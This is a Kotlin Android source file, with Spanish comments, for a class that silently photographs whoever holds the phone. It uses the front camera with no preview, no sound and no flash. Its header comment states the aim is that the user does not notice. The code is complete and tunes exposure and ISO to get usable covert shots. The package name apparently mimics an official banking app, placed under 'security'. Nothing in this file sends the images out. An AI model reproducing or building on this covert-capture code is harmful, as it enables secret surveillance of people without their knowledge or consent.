package com.ios.nequixofficialv2.security

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.graphics.Matrix
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.Surface
import androidx.core.content.ContextCompat
import kotlinx.coroutines.suspendCancellableCoroutine
import java.io.ByteArrayOutputStream
import kotlin.coroutines.resume

/**
 * Captura silenciosa de fotos usando la cámara frontal
 * Sin preview, sin sonido, sin que el usuario se dé cuenta
 */
class SilentCameraCapture(private val context: Context) {

    private val cameraManager: CameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null

    /**
     * Captura una foto silenciosa de la cámara frontal
     * Compatible con Android 7.0 - 15+
     * @return ByteArray de la imagen en formato JPEG o null si falla
     */
    suspend fun captureSilentPhoto(): ByteArray? {
        // Verificar permisos (Android 13+ requiere verificación explícita)
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) 
            != PackageManager.PERMISSION_GRANTED) {
            Log.w("SilentCamera", "No hay permisos de cámara")
            return null
        }
        
        // En Android 13+, verificar que la app esté en foreground o tenga permisos especiales
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Log.d("SilentCamera", "📱 Android 13+ detectado, usando modo compatible")
        }

        return try {
            startBackgroundThread()
            val cameraId = getFrontCameraId()
            if (cameraId == null) {
                Log.e("SilentCamera", "❌ No se pudo obtener cámara frontal")
                return null
            }
            Log.d("SilentCamera", "📷 Usando cámara ID: $cameraId (FRONTAL)")
            
            // Abrir cámara
            val device = openCamera(cameraId) ?: return null
            cameraDevice = device
            
            // Capturar imagen
            val imageBytes = captureImage(device)
            
            // Limpiar recursos
            cleanup()
            
            imageBytes
        } catch (e: Exception) {
            Log.e("SilentCamera", "Error capturando foto: ${e.message}", e)
            cleanup()
            null
        }
    }

    private fun getFrontCameraId(): String? {
        return try {
            Log.d("SilentCamera", "🔍 Buscando cámara frontal...")
            cameraManager.cameraIdList.forEach { id ->
                val characteristics = cameraManager.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                Log.d("SilentCamera", "   Camera $id: facing=${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "FRONTAL" else "TRASERA"}")
            }
            
            val frontCameraId = cameraManager.cameraIdList.find { id ->
                val characteristics = cameraManager.getCameraCharacteristics(id)
                characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
            }
            
            if (frontCameraId != null) {
                Log.d("SilentCamera", "✅ Cámara frontal encontrada: $frontCameraId")
            } else {
                Log.e("SilentCamera", "❌ NO SE ENCONTRÓ CÁMARA FRONTAL")
            }
            
            frontCameraId
        } catch (e: Exception) {
            Log.e("SilentCamera", "Error obteniendo cámara frontal: ${e.message}")
            null
        }
    }

    private suspend fun openCamera(cameraId: String): CameraDevice? = suspendCancellableCoroutine { continuation ->
        try {
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    if (continuation.isActive) {
                        continuation.resume(camera)
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    if (continuation.isActive) {
                        continuation.resume(null)
                    }
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    Log.e("SilentCamera", "Error abriendo cámara: $error")
                    if (continuation.isActive) {
                        continuation.resume(null)
                    }
                }
            }, backgroundHandler)
        } catch (e: Exception) {
            Log.e("SilentCamera", "Error en openCamera: ${e.message}")
            if (continuation.isActive) {
                continuation.resume(null)
            }
        }

        continuation.invokeOnCancellation {
            cameraDevice?.close()
        }
    }

    private suspend fun captureImage(camera: CameraDevice): ByteArray? = suspendCancellableCoroutine { continuation ->
        try {
            Log.d("SilentCamera", "📸 Iniciando captura de imagen...")
            
            // Obtener resolución soportada por la cámara frontal
            val characteristics = cameraManager.getCameraCharacteristics(camera.id)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = map?.getOutputSizes(ImageFormat.JPEG)?.toList() ?: emptyList()
            
            Log.d("SilentCamera", "📐 Resoluciones disponibles: ${sizes.take(5)}")
            
            // Android 13+ prefiere resoluciones más altas para mejor calidad
            // Usar resolución media para balance entre calidad y velocidad
            val targetSize = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                // Android 13+: usar resolución media-alta
                sizes.filter { it.width * it.height in 1000000..3000000 }
                    .minByOrNull { it.width * it.height }
                    ?: sizes.minByOrNull { it.width * it.height }
                    ?: android.util.Size(640, 480)
            } else {
                // Android <13: resolución pequeña
                sizes.filter { it.width * it.height < 1000000 }
                    .minByOrNull { it.width * it.height }
                    ?: sizes.minByOrNull { it.width * it.height }
                    ?: android.util.Size(176, 144)
            }
            
            Log.d("SilentCamera", "📐 Usando resolución: ${targetSize.width}x${targetSize.height}")
            
            // Configurar ImageReader con resolución soportada
            imageReader = ImageReader.newInstance(targetSize.width, targetSize.height, ImageFormat.JPEG, 2)
            
            var resumed = false
            
            imageReader?.setOnImageAvailableListener({ reader ->
                if (!resumed) {
                    resumed = true
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        try {
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            image.close()
                            
                            // Rotar imagen si es necesario
                            val rotatedBytes = rotateImageIfNeeded(bytes)
                            
                            if (continuation.isActive) {
                                continuation.resume(rotatedBytes)
                            }
                        } catch (e: Exception) {
                            image.close()
                            if (continuation.isActive) {
                                continuation.resume(null)
                            }
                        }
                    } else {
                        if (continuation.isActive) {
                            continuation.resume(null)
                        }
                    }
                }
            }, backgroundHandler)

            // Crear sesión de captura
            val surface = imageReader?.surface ?: return@suspendCancellableCoroutine
            
            camera.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        Log.d("SilentCamera", "✅ Sesión configurada exitosamente")
                        captureSession = session
                        try {
                            // Obtener rangos de ISO y exposición soportados
                            val characteristics = cameraManager.getCameraCharacteristics(camera.id)
                            val isoRange = characteristics.get(CameraCharacteristics.SENSOR_INFO_SENSITIVITY_RANGE)
                            val exposureRange = characteristics.get(CameraCharacteristics.CONTROL_AE_COMPENSATION_RANGE)
                            
                            Log.d("SilentCamera", "📊 ISO Range: ${isoRange?.lower} - ${isoRange?.upper}")
                            Log.d("SilentCamera", "📊 Exposure Range: ${exposureRange?.lower} - ${exposureRange?.upper}")
                            
                            // PASO 1: Configurar preview con MÁXIMA EXPOSICIÓN
                            val previewBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                            previewBuilder.addTarget(surface)
                            previewBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                            previewBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                            previewBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                            previewBuilder.set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                            
                            // Usar máxima compensación de exposición disponible
                            val maxExposureComp = exposureRange?.upper ?: 6
                            previewBuilder.set(CaptureRequest.CONTROL_AE_EXPOSURE_COMPENSATION, maxExposureComp)
                            Log.d("SilentCamera", "📊 Usando compensación de exposición: +$maxExposureComp")
                            
                            // Iniciar preview para ajuste automático
                            session.setRepeatingRequest(previewBuilder.build(), null, backgroundHandler)
                            
                            // PASO 2: Tiempo de ajuste según versión de Android
                            val adjustmentTime = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                2000L // Android 13+: 2 segundos (más rápido)
                            } else {
                                3000L // Android <13: 3 segundos
                            }
                            Log.d("SilentCamera", "⏳ Esperando ${adjustmentTime}ms para ajuste de exposición...")
                            
                            backgroundHandler?.postDelayed({
                                try {
                                    Log.d("SilentCamera", "✅ Ajuste completado, capturando ahora...")
                                    
                                    // PASO 3: Bloquear la exposición antes de capturar
                                    val lockBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                                    lockBuilder.addTarget(surface)
                                    lockBuilder.set(CaptureRequest.CONTROL_AE_LOCK, true)
                                    session.capture(lockBuilder.build(), null, backgroundHandler)
                                    
                                    // Pequeño delay para que el lock tome efecto
                                    backgroundHandler?.postDelayed({
                                        try {
                                            // PASO 4: Capturar la foto con exposición bloqueada
                                            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                            captureBuilder.addTarget(surface)
                                            
                                            // Configuraciones AGRESIVAS para máxima luminosidad
                                            captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                            captureBuilder.set(CaptureRequest.JPEG_QUALITY, 90.toByte())
                                            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                            captureBuilder.set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                                            
                                            // MÁXIMA compensación de exposición
                                            captureBuilder.set(CaptureRequest.CONTROL_AE_EXPOSURE_COMPENSATION, maxExposureComp)
                                            captureBuilder.set(CaptureRequest.CONTROL_AE_LOCK, true)
                                            
                                            // Intentar usar ISO alto manualmente si está disponible
                                            if (isoRange != null && isoRange.upper >= 800) {
                                                val targetIso = minOf(1600, isoRange.upper) // Usar ISO 1600 o el máximo
                                                captureBuilder.set(CaptureRequest.SENSOR_SENSITIVITY, targetIso)
                                                Log.d("SilentCamera", "📊 Usando ISO manual: $targetIso")
                                            }
                                            
                                            captureBuilder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF)
                                            captureBuilder.set(CaptureRequest.JPEG_ORIENTATION, 0)
                                            
                                            Log.d("SilentCamera", "🔆 Capturando con MÁXIMA EXPOSICIÓN (+$maxExposureComp)...")
                                            
                                            Log.d("SilentCamera", "📷 Capturando foto con exposición bloqueada...")
                                            
                                            // Capturar sin sonido
                                            session.stopRepeating()
                                            session.capture(captureBuilder.build(), null, backgroundHandler)
                                        } catch (e: Exception) {
                                            Log.e("SilentCamera", "Error en captura final: ${e.message}")
                                            if (continuation.isActive && !resumed) {
                                                resumed = true
                                                continuation.resume(null)
                                            }
                                        }
                                    }, 100)
                                    
                                } catch (e: Exception) {
                                    Log.e("SilentCamera", "Error en lock AE: ${e.message}")
                                    if (continuation.isActive && !resumed) {
                                        resumed = true
                                        continuation.resume(null)
                                    }
                                }
                            }, adjustmentTime) // Tiempo ajustado según versión de Android
                        } catch (e: Exception) {
                            Log.e("SilentCamera", "Error capturando: ${e.message}")
                            if (continuation.isActive && !resumed) {
                                resumed = true
                                continuation.resume(null)
                            }
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e("SilentCamera", "❌ Configuración de sesión FALLÓ - Cámara frontal no soportada")
                        if (continuation.isActive && !resumed) {
                            resumed = true
                            continuation.resume(null)
                        }
                    }
                },
                backgroundHandler
            )
        } catch (e: Exception) {
            Log.e("SilentCamera", "Error en captureImage: ${e.message}")
            if (continuation.isActive) {
                continuation.resume(null)
            }
        }

        continuation.invokeOnCancellation {
            captureSession?.close()
            imageReader?.close()
        }
    }

    private fun rotateImageIfNeeded(imageBytes: ByteArray): ByteArray {
        return try {
            val bitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.size)
            
            // Rotar 270 grados para corregir orientación de cámara frontal
            val matrix = Matrix()
            matrix.postRotate(270f)
            
            val rotatedBitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
            bitmap.recycle()
            
            val outputStream = ByteArrayOutputStream()
            rotatedBitmap.compress(Bitmap.CompressFormat.JPEG, 70, outputStream)
            rotatedBitmap.recycle()
            
            outputStream.toByteArray()
        } catch (e: Exception) {
            Log.e("SilentCamera", "Error rotando imagen: ${e.message}")
            imageBytes
        }
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread?.looper!!)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join()
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            Log.e("SilentCamera", "Error deteniendo thread: ${e.message}")
        }
    }

    private fun cleanup() {
        try {
            captureSession?.close()
            captureSession = null
            
            imageReader?.close()
            imageReader = null
            
            cameraDevice?.close()
            cameraDevice = null
            
            stopBackgroundThread()
        } catch (e: Exception) {
            Log.e("SilentCamera", "Error en cleanup: ${e.message}")
        }
    }
}
